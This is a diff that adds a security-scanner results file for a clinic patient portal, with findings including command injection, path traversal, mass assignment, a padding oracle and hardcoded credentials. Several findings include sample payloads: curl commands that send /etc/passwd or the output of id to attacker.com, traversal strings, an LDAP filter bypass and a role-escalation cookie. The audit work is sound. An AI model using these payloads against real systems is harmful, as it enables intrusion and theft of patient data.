@@ -1,0 +1,431 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.access-control.mass-assignment-privilege-escalation",
+      "path": "src/lib/preferences.ts",
+      "start": {
+        "line": 9,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 12,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "restoreDashboardLayout() JSON.parses the raw, client-controlled `clinic_layout` cookie and passes the resulting object directly as `data` into prisma.user.update({ where: { id: userId }, data: prefs }) with no field allow-list. It is called unconditionally for every authenticated request in src/app/api/dashboard/route.ts:14 (`await restoreDashboardLayout(user.id, layoutCookie)`). Any authenticated user (including a plain 'patient' role) can set the `clinic_layout` cookie to JSON such as {\"role\":\"clinic_admin\"} or {\"passwordHash\":\"<attacker-hash>\"} or {\"email\":\"attacker@x.com\"} to overwrite arbitrary columns on their own User row, including role, granting themselves clinic_admin privileges or takeover of another account's login via a rewritten passwordHash if the id can be aligned. This is a full privilege-escalation / mass-assignment vulnerability.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improper Control of Dynamically-Managed Code Resources (Mass Assignment)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-document-convert",
+      "path": "src/lib/documentConvert.ts",
+      "start": {
+        "line": 8,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 12,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "convertDocumentToFormat() builds a shell command string with execSync(`pandoc \"${sourcePath}\" -o \"${outputPath}\" -t ${format}`) where `format` is taken unescaped and unquoted from a request query parameter. It is reachable via GET src/app/api/documents/[id]/convert/route.ts:22 (`const format = searchParams.get(\"format\") || \"pdf\"`) then passed straight to convertDocumentToFormat(document.filePath, format) at line 37 with no allow-list check (unlike the paired safe convertVisitRecordToFormat, which restricts to ALLOWED_RECORD_FORMATS and uses spawnSync with shell:false). Any authenticated non-patient user can pass format=\"pdf; curl attacker.com/$(cat /etc/passwd)\" to achieve OS command injection.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-label-printing",
+      "path": "src/lib/labelPrinting.ts",
+      "start": {
+        "line": 8,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 11,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "queuePrescriptionLabel() builds `const cmd = `labelctl print --job ${prescriptionId} --layout ${layoutPreset}`` and executes it with spawn(\"sh\", [\"-c\", cmd], { shell: true }). `layoutPreset` comes directly from the client JSON body in src/app/api/prescriptions/[id]/label/route.ts:22 (`const { layoutPreset } = await request.json()`) and is passed unsanitized at line 32 (`queuePrescriptionLabel(id, layoutPreset || \"standard\")`) with no allow-list (unlike the paired safe queueChartLabel, which checks ALLOWED_LAYOUT_PRESETS and uses spawnSync with shell:false). A clinician/front-desk/admin user can supply layoutPreset=\"standard; curl attacker.com/$(id)\" to execute arbitrary OS commands on the server.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.clinic-form-file-read",
+      "path": "src/lib/formLibrary.ts",
+      "start": {
+        "line": 13,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 16,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "loadClinicForm() builds `path.join(FORMS_DIR, `${formName}.pdf`)` from an attacker-controlled `formName` and reads it with fs.readFileSync without resolving/verifying the result stays inside FORMS_DIR (unlike the paired safe loadIntakeForm, which resolves the path and checks it starts with INTAKE_FORMS_DIR + path.sep). It is reachable via GET src/app/api/documents/forms/route.ts:16-22, where `formName` is taken directly from the `formName` query parameter with no sanitization. Any authenticated user can request formName=\"../../../../etc/passwd%00\" style traversal sequences (e.g. \"../../../../some/other/dir/secret\") to read arbitrary .pdf-suffixed files elsewhere on disk, or combine with known upload paths to read other patients' documents.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.letterhead-upload-arbitrary-write",
+      "path": "src/app/api/admin/settings/letterhead/route.ts",
+      "start": {
+        "line": 25,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 30,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The letterhead upload handler takes the uploaded file's client-supplied `file.name` and uses it directly in `path.join(brandingDir, file.name)` (line 28) before writing the uploaded bytes with writeFile (line 30), with no basename sanitization. A clinic_admin (or any user able to reach this endpoint, e.g. via a compromised admin session or a future authorization regression) can set the multipart filename to a traversal sequence such as \"../../../../some/path/whatever.js\" to write the uploaded file outside the intended public/branding directory, potentially overwriting application files.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.export-batch-cache-write",
+      "path": "src/lib/reportCache.ts",
+      "start": {
+        "line": 12,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 17,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "persistExportBatch() joins an attacker/client-controlled `batchId` directly into a file path (`path.join(CACHE_DIR, `${batchId}.csv`)`) and writes to it with no sanitization (unlike the paired safe persistExportSnapshot, which applies path.basename(batchId) first). It is reachable via src/app/api/admin/export/appointments/route.ts:103-106, where `batchId` is read verbatim from the client-supplied `clinic_batch` cookie (`request.cookies.get(\"clinic_batch\")?.value`) and passed straight into persistExportBatch(batchId, csv). An admin session with a crafted cookie value like \"../../../../tmp/pwned\" can write the CSV export to an arbitrary path outside the report-cache directory.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.unverified-referral-claim-forgery",
+      "path": "src/lib/referralLink.ts",
+      "start": {
+        "line": 26,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 30,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "readReferralClaim() splits the `code` parameter and base64url-decodes the payload segment, returning it as a trusted ReferralClaim without ever recomputing or checking an HMAC/signature (unlike the paired safe admitReferralClaim, which verifies an HMAC-SHA256 signature with crypto.timingSafeEqual and checks expiry). It is used unauthenticated in GET src/app/api/referrals/intake/route.ts:12-26, so any external caller can forge a `code` query parameter such as `<header>.<base64url({\"patientExternalId\":\"<any-policy-no>\",\"partnerId\":\"attacker\",\"exp\":9999999999})>.<anything>` to (a) look up and exfiltrate any patient's firstName/lastName/email by guessing/brute-forcing insurancePolicyNo, and (b) overwrite that patient's insuranceProvider field, all without any authentication.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.cbc-no-integrity-padding-oracle",
+      "path": "src/lib/recordRelease.ts",
+      "start": {
+        "line": 20,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 36,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "openExternalReleaseEnvelope() decrypts caller-supplied ciphertext with AES-256-CBC and no MAC/integrity check (unlike the paired admitPartnerReleaseEnvelope, which uses AES-256-GCM with an authentication tag), then distinguishes and returns a different error (\"Envelope padding invalid\") specifically when a PKCS#7 unpadding or 'bad decrypt' failure occurs versus a generic decryption failure. This error-message oracle is exposed with no authentication at all via POST src/app/api/documents/external-release/route.ts (the whole route has no getCurrentUser()/session check), letting an attacker perform a classic CBC padding-oracle attack: submit crafted ciphertext blocks, observe which error message comes back, and decrypt or forge release envelopes byte-by-byte without knowing RECORD_RELEASE_KEY, exposing summaryId/partnerOfficeId identifiers for arbitrary released visit summaries.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature",
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cors.reflected-origin-referral-intake",
+      "path": "src/app/api/referrals/intake/route.ts",
+      "start": {
+        "line": 61,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 63,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The referral-intake response reflects whatever `Origin` request header the caller sends straight back as `Access-Control-Allow-Origin` (`if (origin) { response.headers.set(\"Access-Control-Allow-Origin\", origin); }`) with no allow-list check, unlike the paired src/app/api/referrals/resolve/route.ts, which validates `origin` against a fixed PARTNER_PORTAL_ORIGINS list before reflecting it. Combined with the unverified referral claim (readReferralClaim), this lets any arbitrary website's browser-side JavaScript cross-origin-fetch this endpoint and read the returned patient PHI (name, partner ID) directly.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection-directory-search",
+      "path": "src/lib/directoryService.ts",
+      "start": {
+        "line": 47,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 50,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "queryEmployeeDirectory() builds the LDAP filter `(cn=*${searchTerm}*)` by directly interpolating the caller-supplied `searchTerm` with no escaping (unlike the paired findUserByEmail, which runs escapeDirectoryFilterTerm() on the input first). It is reachable via GET src/app/api/providers/coverage-directory/route.ts:18-27, where the `q` query parameter is passed straight through with no sanitization. An authenticated staff user can inject LDAP filter metacharacters (e.g. `*)(uid=*))(|(uid=*`) to broaden or bypass the intended search filter against the corporate directory bridge, potentially enumerating or matching directory records outside the intended float-staff search scope.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.weak-random-companion-code",
+      "path": "src/lib/companionAccess.ts",
+      "start": {
+        "line": 10,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 11,
+        "col": 55,
+        "offset": 0
+      },
+      "extra": {
+        "message": "issueCompanionViewCode() generates the waiting-room companion check-in code with `Math.random().toString(36).substring(2, 10)`, a non-cryptographic, predictable PRNG (unlike the paired issueRecordShareCode, which uses crypto.randomBytes(16)). This code is later trusted as a bearer credential in resumeCompanionViewSession (src/app/api/appointments/[id]/companion-link/route.ts:56-61), which grants read access to an appointment's startTime/status/reason once the cookie value matches the stored code. Math.random()'s internal state can be predicted/brute-forced (only ~8 base-36 chars of entropy, further reduced by Math.random's known statistical weaknesses), letting an attacker guess or reconstruct valid companion codes and hijack another patient's companion view session.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.hardcoded-secrets.session-signing-default",
+      "path": "src/lib/session.ts",
+      "start": {
+        "line": 12,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 12,
+        "col": 80,
+        "offset": 0
+      },
+      "extra": {
+        "message": "sessionOptions.password falls back to the hardcoded literal \"dev-secret-change-in-production-min-32-chars!!\" whenever the SESSION_SECRET environment variable is not set. This value, present in the source tree, is used by iron-session to encrypt/sign the `clinic_portal_session` cookie that carries userId/role for every authenticated request. If SESSION_SECRET is left unset in any deployment, anyone who has read this source file can forge arbitrary session cookies (e.g. claiming role: \"clinic_admin\") and fully bypass authentication and authorization.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.dos.unbounded-appointment-series-expansion",
+      "path": "src/lib/seriesScheduling.ts",
+      "start": {
+        "line": 20,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 40,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "expandAppointmentSeries() loops `occurrences` times creating a database row each iteration with no upper bound on `occurrences` (unlike the paired expandProviderScheduleWeeks, which enforces MAX_SCHEDULE_WEEKS = 26). It is reachable via POST src/app/api/appointments/series/route.ts:30-44, where `occurrences` is parsed directly from the client-supplied `X-Series-Occurrences` request header (`parseInt(request.headers.get(\"x-series-occurrences\") || \"1\", 10)`) with no maximum check before being passed to expandAppointmentSeries. Any authenticated patient can set this header to a very large value (e.g. 1000000) to force the server to synchronously create an enormous number of Appointment rows, exhausting database and server resources.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-770: Allocation of Resources Without Limits or Throttling"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-exposure.spoofable-debug-header",
+      "path": "src/lib/exportDiagnostics.ts",
+      "start": {
+        "line": 11,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 28,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "describeExportFailure() returns the raw exception message and full stack trace in the JSON response whenever the request carries `x-clinic-channel: ops-console` (line 15), a plain client-supplied header with no server-side verification that the caller is actually the trusted internal ops console. It is used in the catch block of GET src/app/api/admin/export/appointments/route.ts:24-26. Any admin-authenticated caller (or anyone who can reach this endpoint) can simply add the header themselves to force an error and receive internal error messages and stack traces, leaking implementation details (file paths, query internals, driver messages) useful for further attacks.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.unbounded-float-access-grant",
+      "path": "src/lib/coverageEligibility.ts",
+      "start": {
+        "line": 14,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 31,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "grantFloatStaffAccess() parses `shiftHoursInput` with plain parseInt() and applies no upper/lower bound or integer validation before computing `expiresAt` and persisting cross-clinic access (unlike the paired grantVerifiedFloatAccess, which uses Number.parseInt with radix 10 and throws unless the value is an integer in (0, 12]). It is reachable via POST src/app/api/providers/coverage-directory/grant/route.ts:17-25, where `shiftHours` comes directly from the client JSON body. Any non-patient authenticated user can request shiftHours=\"876000\" (100 years) to grant a float staff member's cross-clinic read access for an effectively unlimited duration instead of a single shift.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-863: Incorrect Authorization"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.hardcoded-secrets.database-credentials",
+      "path": "src/lib/prisma.ts",
+      "start": {
+        "line": 7,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 13,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "createPrismaClient() constructs the PrismaPg adapter with hardcoded connection parameters, including `user: \"postgres\"` and `password: \"postgres\"`, instead of reading them from environment configuration. Anyone with source access knows the exact database credentials used by every deployment of this code unless it is patched before shipping.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-exposure.api-key-in-url-query-string",
+      "path": "src/lib/clearinghouse.ts",
+      "start": {
+        "line": 15,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 15,
+        "col": 90,
+        "offset": 0
+      },
+      "extra": {
+        "message": "submitClaimToClearinghouse() places the secret CLEARINGHOUSE_KEY and the patientId directly into the request URL's query string (`${CLEARINGHOUSE_BASE}/api/claims?api_key=${CLEARINGHOUSE_KEY}&patientId=${claim.patientId}`) instead of sending the key as an Authorization header (as submitFulfillmentToPharmacyNetwork correctly does two lines below). URLs are commonly logged in full by proxies, load balancers, and server access logs, risking exposure of the clearinghouse API key and patient identifiers in log files.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-598: Use of GET Request Method With Sensitive Query Strings"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
